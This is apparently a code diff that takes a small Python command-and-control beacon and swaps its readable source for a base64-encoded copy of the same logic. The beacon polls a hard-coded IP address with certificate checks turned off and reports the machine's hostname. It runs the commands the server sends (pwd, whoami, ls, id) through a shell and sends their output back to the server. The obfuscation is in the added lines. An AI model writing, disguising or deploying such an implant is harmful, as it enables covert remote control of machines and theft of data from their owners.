@@ -1,32 +1,26 @@
-import requests
-import time
-import socket
-import subprocess
-import urllib3
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-import urllib.parse
-
-SERVER = "https://172.179.101.52"
-while (True):
-    hostname = socket.gethostname()
-    r = None
-    noconn = False
-    try:
-        r = requests.get(SERVER + "/checkin?hostname=" + hostname, verify=False)
-    except:
-        noconn = True
-    if (noconn == False):
-        # is there a job for me?
-        data = r.text
-        if (data == "stop"):
-            exit()
-        elif (data == "nop"):
-            # no op, do nothing
-            x = 1
-        elif (data == "pwd" or data == "whoami" or data == "ls" or data == "id"):
-            args = [data]
-            result = subprocess.run(args, shell=True, capture_output=True, text=True)
-            combo = urllib.parse.quote_plus(result.stdout + result.stderr)
-            r = requests.get(SERVER + "/upload?hostname=" + hostname + "&data=" + combo, verify=False)
-    #print("[ ] Sleeping 10 seconds")
-    time.sleep(10)
+aW1wb3J0IHJlcXVlc3RzCmltcG9ydCB0aW1lCmltcG9ydCBzb2NrZXQKaW1wb3J0IHN1YnByb2Nl
+c3MKaW1wb3J0IHVybGxpYjMKdXJsbGliMy5kaXNhYmxlX3dhcm5pbmdzKHVybGxpYjMuZXhjZXB0
+aW9ucy5JbnNlY3VyZVJlcXVlc3RXYXJuaW5nKQppbXBvcnQgdXJsbGliLnBhcnNlCgpTRVJWRVIg
+PSAiaHR0cHM6Ly8xNzIuMTc5LjEwMS41MiIKd2hpbGUgKFRydWUpOgogICAgaG9zdG5hbWUgPSBz
+b2NrZXQuZ2V0aG9zdG5hbWUoKQogICAgciA9IE5vbmUKICAgIG5vY29ubiA9IEZhbHNlCiAgICB0
+cnk6CiAgICAgICAgciA9IHJlcXVlc3RzLmdldChTRVJWRVIgKyAiL2NoZWNraW4/aG9zdG5hbWU9
+IiArIGhvc3RuYW1lLCB2ZXJpZnk9RmFsc2UpCiAgICBleGNlcHQ6CiAgICAgICAgbm9jb25uID0g
+VHJ1ZQogICAgaWYgKG5vY29ubiA9PSBGYWxzZSk6CiAgICAgICAgIyBpcyB0aGVyZSBhIGpvYiBm
+b3IgbWU/CiAgICAgICAgZGF0YSA9IHIudGV4dAogICAgICAgIGlmIChkYXRhID09ICJzdG9wIik6
+CiAgICAgICAgICAgIGV4aXQoKQogICAgICAgIGVsaWYgKGRhdGEgPT0gIm5vcCIpOgogICAgICAg
+ICAgICAjIG5vIG9wLCBkbyBub3RoaW5nCiAgICAgICAgICAgIHggPSAxCiAgICAgICAgICAgICcn
+JwogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICBjb21tYW5kID0gZGF0YS5yZXBsYWNlKCJc
+biIsJycpLnJlcGxhY2UoJ1xyJywnJykKICAgICAgICAgICAgcHJpbnQoIkdvdCBjb21tYW5kOiAi
+ICsgY29tbWFuZCkKICAgICAgICAgICAgYXJncyA9IFtdCiAgICAgICAgICAgIGlmICgnICcgaW4g
+Y29tbWFuZCk6CiAgICAgICAgICAgICAgICBhcmdwID0gY29tbWFuZC5zcGxpdCgnICcpCiAgICAg
+ICAgICAgICAgICBmb3IgYSBpbiBhcmdwOgogICAgICAgICAgICAgICAgICAgIGFyZ3MuYXBwZW5k
+KGEpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBhcmdzLmFwcGVuZChjb21tYW5k
+KQogICAgICAgICAgICAjcHJpbnQoIlJ1bm5pbmcgYXJnczogIiArIHN0cihhcmdzKSkKICAgICAg
+ICAgICAgJycnCiAgICAgICAgZWxpZiAoZGF0YSA9PSAicHdkIiBvciBkYXRhID09ICJ3aG9hbWki
+IG9yIGRhdGEgPT0gImxzIiBvciBkYXRhID09ICJpZCIpOgogICAgICAgICAgICBhcmdzID0gW2Rh
+dGFdCiAgICAgICAgICAgIHJlc3VsdCA9IHN1YnByb2Nlc3MucnVuKGFyZ3MsIHNoZWxsPVRydWUs
+IGNhcHR1cmVfb3V0cHV0PVRydWUsIHRleHQ9VHJ1ZSkKICAgICAgICAgICAgY29tYm8gPSB1cmxs
+aWIucGFyc2UucXVvdGVfcGx1cyhyZXN1bHQuc3Rkb3V0ICsgcmVzdWx0LnN0ZGVycikKICAgICAg
+ICAgICAgciA9IHJlcXVlc3RzLmdldChTRVJWRVIgKyAiL3VwbG9hZD9ob3N0bmFtZT0iICsgaG9z
+dG5hbWUgKyAiJmRhdGE9IiArIGNvbWJvLCB2ZXJpZnk9RmFsc2UpCiAgICAjcHJpbnQoIlsgXSBT
+bGVlcGluZyAxMCBzZWNvbmRzIikKICAgIHRpbWUuc2xlZXAoMTApCgo=
